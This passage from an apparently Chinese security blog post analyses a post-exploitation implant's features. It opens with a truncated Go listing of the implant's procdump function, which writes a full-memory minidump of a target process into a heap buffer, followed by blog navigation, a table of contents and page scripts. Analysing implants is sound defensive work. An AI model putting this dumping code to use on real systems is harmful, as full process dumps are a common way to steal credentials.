.Config.Debug&#125;&#125;</span></div><div class="line">		log.Println(<span class="string">"RefreshPE failed:"</span>, err)</div><div class="line">		<span class="comment">//&#123;&#123;end&#125;&#125;</span></div><div class="line">		<span class="keyword">return</span> dump, err</div><div class="line">	&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">	heapHandle, err := syscalls.GetProcessHeap()</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		<span class="keyword">return</span> dump, err</div><div class="line">	&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">	procMemCounters := syscalls.ProcessMemoryCounters&#123;&#125;</div><div class="line">	sizeOfMemCounters := <span class="keyword">uint32</span>(unsafe.Sizeof(procMemCounters))</div><div class="line">	err = syscalls.GetProcessMemoryInfo(proc, &amp;procMemCounters, sizeOfMemCounters)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		<span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line">		log.Printf(<span class="string">"GetProcessMemoryInfo failed: %s\n"</span>, err)</div><div class="line">		<span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line">		<span class="keyword">return</span> dump, err</div><div class="line">	&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">	heapSize := procMemCounters.WorkingSetSize + IncrementSize</div><div class="line"><span class="comment">//</span></div><div class="line">	dumpBuffer, err := syscalls.HeapAlloc(heapHandle, <span class="number">0x00000008</span>, <span class="keyword">uintptr</span>(heapSize))</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		<span class="keyword">return</span> dump, err</div><div class="line">	&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">	outData := outDump&#123;</div><div class="line">		outPtr: dumpBuffer,</div><div class="line">	&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">	callbackInfo := MiniDumpCallbackInformation&#123;</div><div class="line">		CallbackRoutine: windows.NewCallback(minidumpCallback),</div><div class="line">		CallbackParam:   <span class="keyword">uintptr</span>(unsafe.Pointer(&amp;outData)),</div><div class="line">	&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">	err = syscalls.MiniDumpWriteDump(</div><div class="line">		proc,</div><div class="line">		pid,</div><div class="line">		<span class="number">0</span>,</div><div class="line">		MiniDumpWithFullMemory,</div><div class="line">		<span class="number">0</span>,</div><div class="line">		<span class="number">0</span>,</div><div class="line">		<span class="keyword">uintptr</span>(unsafe.Pointer(&amp;callbackInfo)),</div><div class="line">	)</div><div class="line"><span class="comment">//</span></div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		<span class="comment">//&#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line">		log.Println(<span class="string">"Minidump syscall failed:"</span>, err)</div><div class="line">		<span class="comment">//&#123;&#123;end&#125;&#125;</span></div><div class="line">		<span class="keyword">return</span> dump, err</div><div class="line">	&#125;</div><div class="line">[...]</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2023/02/20/detect thread Inject——以Get-InjectedThread为例/" rel="next" title="detect threat inject —— 以Get-InjectedThread为例">
+                <i class="fa fa-chevron-left"></i> detect threat inject —— 以Get-InjectedThread为例
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2023/04/02/Execute-Assembly攻守之道/" rel="prev" title="Execute-Assembly 攻守之道">
+                Execute-Assembly 攻守之道 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">HaCky</p>
+              <p class="site-description motion-element" itemprop="description">我是最菜的HaCky呀</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">84</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">分类</span>
+                
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Implant上线分析"><span class="nav-number">1.</span> <span class="nav-text">Implant上线分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Implant功能分析"><span class="nav-number">2.</span> <span class="nav-text">Implant功能分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-backdoor"><span class="nav-number">2.1.</span> <span class="nav-text">0x01 backdoor</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-dllhijack功能"><span class="nav-number">2.2.</span> <span class="nav-text">0x02 dllhijack功能</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-ExecuteAssembly"><span class="nav-number">2.3.</span> <span class="nav-text">0x03 ExecuteAssembly</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-getprivs"><span class="nav-number">2.4.</span> <span class="nav-text">0x04 getprivs</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-getststem"><span class="nav-number">2.5.</span> <span class="nav-text">0x05 getststem</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-impersonate"><span class="nav-number">2.6.</span> <span class="nav-text">0x06 impersonate</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x07-make-token"><span class="nav-number">2.7.</span> <span class="nav-text">0x07 make-token</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x08-psexec"><span class="nav-number">2.8.</span> <span class="nav-text">0x08 psexec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x09-runas"><span class="nav-number">2.9.</span> <span class="nav-text">0x09 runas</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x10-spawdll"><span class="nav-number">2.10.</span> <span class="nav-text">0x10 spawdll</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x11-procdump"><span class="nav-number">2.11.</span> <span class="nav-text">0x11 procdump</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">HaCky</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
